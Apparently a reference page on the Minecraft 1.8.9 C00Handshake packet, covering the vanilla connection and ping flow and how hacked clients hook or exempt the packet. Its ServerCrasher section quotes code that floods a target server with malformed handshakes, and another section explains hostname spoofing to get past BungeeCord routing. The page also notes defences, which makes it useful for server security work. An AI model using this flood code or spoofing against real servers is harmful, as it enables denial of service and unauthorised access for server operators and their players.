Notes

Determines whether the connection enters STATUS or LOGIN state. Sent by GuiConnecting.java during server connection, Minecraft.java for local singleplayer, OldServerPinger.java for server list pinging, and RealmsConnect.java for Realms. The requestedState field is critical: value 1 enters STATUS (used by server pinger), value 2 enters LOGIN (used for actual gameplay).

implementation Implementation Cases

C00Handshake is the absolute first packet sent when a client connects to a Minecraft server. It contains the protocol version (47 for 1.8.9), the server hostname/IP, the port, and most importantly the requested next state (1 = STATUS for pinging, 2 = LOGIN for gameplay). While not commonly targeted by combat modules, it's used extensively in connection-related exploits: ServerCrashing, FakeConnections (spam handshakes to stress server), VPN detectors (analyze handshake timing), and BungeeCord bypass exploits (spoof the hostname field). The packet is sent before any encryption or compression is negotiated.

ServerCrasher / FakeConnections (Jigsaw 0.26, RektSky B5)

Overwhelm a target server by sending malformed or massive numbers of handshake packets, causing the server to exhaust its connection pool or crash from invalid state transitions.

The module opens connections to the target server and sends C00Handshake packets with invalid protocol versions, extremely long hostnames (>255 chars, causing buffer overflow on certain server implementations), or repeatedly sends handshake packets then immediately closes the connection (SYN flood variant at application layer). Some variants spoof the hostname field to confuse BungeeCord proxies into routing the connection incorrectly.

// RektSky B5 - ServerCrasher.java (handshake flood) // Sends malformed C00Handshake to crash or lag server public void crash() { for (int i = 0; i < 1000; i++) { // Create new connection and send invalid handshake NetworkManager nm = NetworkManager.createNetworkManagerAndConnect( ip, port, mc.gameSettings.language.equals("Crasher")); nm.sendPacket(new C00Handshake( Integer.MAX_VALUE, // invalid protocol version generateRandomString(1000), // oversized hostname port, EnumConnectionState.LOGIN)); nm.closeChannel(new ChatComponentText("crash")); } } // Jigsaw 0.26 - ServerCrasher floods handshake packets // NetworkManager.java - normal handshake send: public void sendPacket(Packet packet) { Jigsaw.onPacketSent(abstractPacket); // if not intercepted by Jigsaw modules, dispatches normally sendPacketFinal(abstractPacket); } // Vanilla connection flow (GuiConnecting.java): networkManager.sendPacket(new C00Handshake( 47, ip, port, EnumConnectionState.LOGIN)); networkManager.sendPacket(new C00PacketLoginStart(profile));
Vanilla hook: NetHandlerHandshakeTCP.processHandshake(C00Handshake) — the server-side handler reads the state field and transitions the connection to STATUS or LOGIN. On the client side, GuiConnecting.java sends this packet after the TCP connection is established.
Most anti-cheats don't inspect C00Handshake at all since it's pre-login. However, server-side firewalls (like TCPShield) rate-limit connections from a single IP. BungeeCord proxies validate the hostname field against their config — spoofing it can crash the proxy. Modern servers use Velocity/BungeeGuard which signs handshake packets with HMAC to prevent hostname spoofing.
BungeeCord Spoof / Hostname Bypass (Rise 6.0)

Spoof the serverAddress field in the handshake to bypass BungeeCord forced-host checks, allowing connection to back-end servers directly or accessing restricted sub-servers.

BungeeCord uses the hostname field to route players to specific back-end servers. By forging this field, a client can connect to a server that would normally be unreachable. The module intercepts the GuiConnecting handshake send and replaces the IP with a targeted sub-server hostname. This is the client-side equivalent of editing the Windows hosts file.

// Rise 6.0 - GuiConnecting.java connection setup: NetworkManager networkmanager = NetworkManager.createNetworkManagerAndConnect( new InetSocketAddress(ip, port), false); networkmanager.setNetHandler(new NetHandlerLoginClient(networkmanager, mc, guiScreen)); // Send the handshake with the REAL hostname networkmanager.sendPacket(new C00Handshake(47, ip, port, EnumConnectionState.LOGIN)); networkmanager.sendPacket(new C00PacketLoginStart(mc.getSession().getProfile())); // BlinkComponent.java in Rise exempts handshake from blink: if (packet instanceof C00Handshake) return; // never delay handshake // Vanilla C00Handshake definition: public class C00Handshake implements Packet { private int protocolVersion; // 47 for 1.8.9 private String ip; // server hostname/IP private int port; private EnumConnectionState requestedState; // STATUS or LOGIN }
Vanilla hook: NetHandlerHandshakeTCP.processHandshake() reads the ip field and passes it to the server implementation. In BungeeCord, this is used to match against the config.yml `forced_hosts` and `listeners` sections.
Modern BungeeCord forks (BungeeGuard, Velocity) add a secret HMAC token to the handshake to verify authenticity. Without the correct token, connections from spoofed hostnames are rejected. Some servers also validate that the IP in the handshake matches the actual connecting IP to prevent UDP spoofing attacks.
Server List Pinger (STATUS State) (All vanilla clients)

Used by the multiplayer server list to ping servers for MOTD, player count, and favicon — this is the standard C00Handshake use with requestedState=STATUS.

When you refresh the server list, OldServerPinger.java creates a short-lived TCP connection, sends C00Handshake with requestedState=STATUS, then sends C00PacketServerQuery. The server responds with S00PacketServerInfo (JSON status response) and S01PacketPong (latency). The connection is then closed.

// Vanilla - OldServerPinger.java (server list pinging): NetworkManager netManager = NetworkManager.createNetworkManagerAndConnect( new InetSocketAddress(ip, port), false); netManager.setNetHandler(new NetHandlerStatusClient(netManager, mc)); // STATUS = 1, LOGIN = 2 netManager.sendPacket(new C00Handshake(47, ip, port, EnumConnectionState.STATUS)); netManager.sendPacket(new C00PacketServerQuery()); // Rise 6.0 - OldServerPinger.java (modified for client): try { NetworkManager netManager = NetworkManager.createNetworkManagerAndConnect( new InetSocketAddress(InetAddress.getByName(serverData.serverIP), serverData.serverPort), false); netManager.setNetHandler(new NetHandlerStatusClient(netManager, mc)); netManager.sendPacket(new C00Handshake(47, serverData.serverIP, serverData.serverPort, EnumConnectionState.STATUS)); netManager.sendPacket(new C00PacketServerQuery()); } catch (Exception e) { ... } // Vanilla C00Handshake fields: public C00Handshake(int version, String ip, int port, EnumConnectionState state) { this.protocolVersion = version; // 47 this.ip = ip; this.port = port; this.requestedState = state; // STATUS or LOGIN }
Vanilla hook: NetHandlerHandshakeTCP.processHandshake() — server side. When state==STATUS, the server switches to NetHandlerStatusServer. When state==LOGIN, it switches to NetHandlerLoginServer.
Some anti-bot plugins track handshake frequency from single IPs. Repeated STATUS handshakes (server pings) at high frequency may trigger rate-limiting or temporary IP bans on some servers. This is NOT an anti-cheat concern, but rather server resource protection.
Blink / PingSpoof Exemption (Rise 6.0)

The C00Handshake is ALWAYS exempted from Blink and PingSpoof — it must never be delayed or spoofed because the server expects it immediately after TCP connect.

Blink buffers outgoing packets and releases them later. PingSpoof delays packets to simulate high latency. Both modules have a hardcoded exemption list for connection-critical packets: C00Handshake, C00PacketLoginStart, C01PacketEncryptionResponse, C00PacketKeepAlive. Delaying these would cause the server to time out the connection.

// Rise 6.0 - BlinkComponent.java exempted packets list: if (packet instanceof C00Handshake || packet instanceof C00PacketLoginStart || packet instanceof C01PacketEncryptionResponse || packet instanceof C00PacketKeepAlive || packet instanceof S00PacketDisconnect || packet instanceof S01PacketEncryptionRequest || packet instanceof S02PacketLoginSuccess || packet instanceof S03PacketEnableCompression) { // Pass through immediately — never buffer these mc.getNetHandler().addToSendQueue(packet); return; } // Rise 6.0 - PingSpoofComponent.java: // Also exempts handshake/login/encryption from delay // These MUST arrive in order and on time for connection to work
Vanilla hook: N/A — this is a client-side module that hooks into the event system (PacketSendEvent in Rise, EventPacket in Aqua, NetworkManager.sendPacket in Jigsaw) to selectively pass or delay packets.
Exempting connection packets from delay modules is standard practice. Without this exemption, the server would see a 5+ second gap between TCP connect and handshake, triggering a timeout and disconnect.
Client-side: GuiConnecting.java sends C00Handshake with state=LOGIN. OldServerPinger.java sends C00Handshake with state=STATUS. Both call NetworkManager.sendPacket() which in hacked clients fires: Jigsaw.onPacketSent() (Jigsaw 0.26), PacketSendEvent (Rise 6.0), HLPacketSentEvent (RektSky B5), EventPacket.SEND (Aqua 13), PacketOutEvent (Memeware 7.3), EventPacket (Sigma 4.11). Server-side: NetHandlerHandshakeTCP.processHandshake(C00Handshake) reads the nextState field and transitions the NetHandler. If state=STATUS, switches to NetHandlerStatusServer. If state=LOGIN, switches to NetHandlerLoginServer which then expects C00PacketLoginStart.
Jigsaw 0.26: Uses a direct hook in NetworkManager.sendPacket() — calls Jigsaw.onPacketSent() for ALL packets including C00Handshake. This means the handshake is accessible to any module that overrides onPacketSent(), though few modules target it. Rise 6.0: Uses two-tier event system (PacketSendEvent + addToSendQueueUnregistered). BlinkComponent and PingSpoofComponent both exempt C00Handshake from their delay queues via hardcoded instanceof checks. RektSky B5: Uses HLPacketSentEvent and PacketSentEvent. ServerCrasher sends C00Handshake directly via NetworkManager.sendPacket() bypassing events. Aqua 13: Uses EventPacket (fired in both NetworkManager.channelRead0 and NetHandlerPlayClient.addToSendQueue). Has 26 separate event listeners; C00Handshake goes through EventReceivedPacket and EventPacket. Sigma 4.11: Uses EventPacket with isOutgoing()/isIncoming(). C00Handshake is rarely targetted by modules — most focus on PLAY-state packets. Memeware 7.3: Uses PacketOutEvent fired from NetHandlerPlayClient.addToSendQueue(). No module in Memeware specifically targets C00Handshake.
